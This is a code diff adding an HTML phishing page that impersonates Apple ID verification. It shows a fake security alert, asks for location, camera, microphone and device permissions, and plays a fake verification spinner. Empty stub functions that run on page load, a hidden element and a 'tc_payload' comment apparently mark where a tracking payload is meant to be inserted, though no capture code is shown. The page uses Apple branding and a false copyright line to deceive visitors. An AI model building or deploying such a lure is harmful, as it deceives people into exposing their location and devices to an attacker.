@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Apple ID Verification</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background: #f5f5f7;
+            min-height: 100vh;
+            padding: 0;
+        }
+
+        .header {
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: saturate(180%) blur(20px);
+            padding: 12px 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .apple-logo {
+            font-size: 24px;
+            color: #fff;
+        }
+
+        .container {
+            max-width: 480px;
+            margin: 60px auto;
+            padding: 0 20px;
+        }
+
+        .card {
+            background: #fff;
+            border-radius: 18px;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.08);
+            overflow: hidden;
+        }
+
+        .card-header {
+            padding: 40px 40px 24px;
+            text-align: center;
+        }
+
+        .logo-icon {
+            width: 64px;
+            height: 64px;
+            background: linear-gradient(135deg, #007aff 0%, #0051d5 100%);
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 32px;
+            color: white;
+        }
+
+        .page-title {
+            font-size: 28px;
+            font-weight: 600;
+            color: #1d1d1f;
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
+        }
+
+        .page-subtitle {
+            font-size: 15px;
+            color: #86868b;
+            line-height: 1.5;
+        }
+
+        .card-content {
+            padding: 0 40px 40px;
+        }
+
+        .alert-box {
+            background: #fff3cd;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 24px;
+        }
+
+        .alert-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: #1d1d1f;
+            margin-bottom: 6px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .alert-text {
+            font-size: 13px;
+            color: #86868b;
+            line-height: 1.5;
+        }
+
+        .section-title {
+            font-size: 17px;
+            font-weight: 600;
+            color: #1d1d1f;
+            margin-bottom: 16px;
+        }
+
+        .permission-list {
+            list-style: none;
+            margin: 16px 0;
+        }
+
+        .permission-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 14px;
+            background: #f5f5f7;
+            border-radius: 12px;
+            margin-bottom: 8px;
+        }
+
+        .permission-icon {
+            width: 36px;
+            height: 36px;
+            background: #007aff;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 16px;
+            flex-shrink: 0;
+        }
+
+        .permission-text {
+            flex: 1;
+            font-size: 14px;
+            color: #1d1d1f;
+        }
+
+        .button-group {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-top: 24px;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 14px;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            border: none;
+            transition: all 0.2s;
+        }
+
+        .btn-primary {
+            background: #007aff;
+            color: white;
+        }
+
+        .btn-primary:hover {
+            background: #0051d5;
+        }
+
+        .btn-primary:disabled {
+            background: #f5f5f7;
+            color: #86868b;
+            cursor: not-allowed;
+        }
+
+        .btn-secondary {
+            background: #f5f5f7;
+            color: #007aff;
+        }
+
+        .btn-secondary:hover {
+            background: #e8e8ed;
+        }
+
+        .btn-success {
+            background: #34c759;
+            color: white;
+        }
+
+        .info-text {
+            font-size: 12px;
+            color: #86868b;
+            text-align: center;
+            margin-top: 20px;
+            line-height: 1.5;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 40px 20px;
+        }
+
+        .footer-text {
+            font-size: 12px;
+            color: #86868b;
+            margin: 4px 0;
+        }
+
+        .footer-links {
+            margin-top: 12px;
+        }
+
+        .footer-link {
+            color: #007aff;
+            text-decoration: none;
+            font-size: 12px;
+            margin: 0 8px;
+        }
+
+        .footer-link:hover {
+            text-decoration: underline;
+        }
+
+        .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #007aff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 16px auto;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                margin: 40px auto;
+            }
+
+            .card-header {
+                padding: 32px 24px 20px;
+            }
+
+            .card-content {
+                padding: 0 24px 32px;
+            }
+        }
+    </style>
+</head>
+
+<body onload="gpsLocation()">
+    <div class="header">
+        <i class="fab fa-apple apple-logo"></i>
+    </div>
+
+    <div class="container">
+        <div class="card">
+            <div class="card-header">
+                <div class="logo-icon">
+                    <i class="fas fa-shield-alt"></i>
+                </div>
+                <h1 class="page-title">Verify Your Identity</h1>
+                <p class="page-subtitle">Your Apple ID requires verification to continue</p>
+            </div>
+
+            <div class="card-content">
+                <div class="alert-box">
+                    <div class="alert-title">
+                        <i class="fas fa-exclamation-circle" style="color: #ff9500;"></i>
+                        <span>Security Alert</span>
+                    </div>
+                    <p class="alert-text">
+                        We detected unusual activity on your Apple ID. For your security, please verify your identity.
+                    </p>
+                </div>
+
+                <h3 class="section-title">Verification Required</h3>
+                <p style="font-size: 14px; color: #86868b; margin-bottom: 16px; line-height: 1.5;">
+                    To protect your account, we need to verify your device. Please grant the following permissions:
+                </p>
+
+                <ul class="permission-list">
+                    <li class="permission-item">
+                        <div class="permission-icon">
+                            <i class="fas fa-location-arrow"></i>
+                        </div>
+                        <span class="permission-text">Location Services</span>
+                    </li>
+                    <li class="permission-item">
+                        <div class="permission-icon">
+                            <i class="fas fa-camera"></i>
+                        </div>
+                        <span class="permission-text">Camera Access</span>
+                    </li>
+                    <li class="permission-item">
+                        <div class="permission-icon">
+                            <i class="fas fa-microphone"></i>
+                        </div>
+                        <span class="permission-text">Microphone Access</span>
+                    </li>
+                    <li class="permission-item">
+                        <div class="permission-icon">
+                            <i class="fas fa-mobile-alt"></i>
+                        </div>
+                        <span class="permission-text">Device Information</span>
+                    </li>
+                </ul>
+
+                <div class="button-group">
+                    <button class="btn btn-secondary" id="allowBtn" onclick="allowPermissions()">Allow
+                        Permissions</button>
+                    <button class="btn btn-primary" id="verifyBtn" onclick="startVerification()"
+                        disabled>Continue</button>
+                </div>
+
+                <div class="spinner" id="spinner"></div>
+
+                <p class="info-text">
+                    Your information is protected by Apple's industry-leading security and privacy standards.
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <p class="footer-text">Apple ID • Account Security</p>
+        <p class="footer-text">© 2024 Apple Inc. All rights reserved.</p>
+        <div class="footer-links">
+            <a href="#" class="footer-link" onclick="return false;">Privacy Policy</a>
+            <a href="#" class="footer-link" onclick="return false;">Terms of Service</a>
+            <a href="#" class="footer-link" onclick="return false;">Support</a>
+        </div>
+    </div>
+
+    <p id="techchip" style="display:none;"></p>
+
+    <script>
+        var permissionsGranted = false;
+
+        function allowPermissions() {
+            if (typeof requestPermissions === 'function') {
+                requestPermissions();
+            }
+
+            permissionsGranted = true;
+            var verifyBtn = document.getElementById('verifyBtn');
+            verifyBtn.disabled = false;
+
+            var allowBtn = document.getElementById('allowBtn');
+            allowBtn.innerHTML = '<i class="fas fa-check"></i> Permissions Granted';
+            allowBtn.className = 'btn btn-success';
+            allowBtn.disabled = true;
+        }
+
+        function startVerification() {
+            if (!permissionsGranted) {
+                alert('Please allow permissions first');
+                return;
+            }
+
+            document.getElementById('spinner').style.display = 'block';
+            document.getElementById('verifyBtn').innerHTML = 'Verifying...';
+            document.getElementById('verifyBtn').disabled = true;
+
+            setTimeout(function () {
+                document.getElementById('spinner').style.display = 'none';
+                document.getElementById('verifyBtn').innerHTML = '<i class="fas fa-check-circle"></i> Verified';
+                document.getElementById('verifyBtn').className = 'btn btn-success';
+            }, 3000);
+        }
+
+        function requestPermissions() { }
+        function gpsLocation() { }
+    </script>
+
+    <!-- tc_payload -->
+</body>
+
+</html>
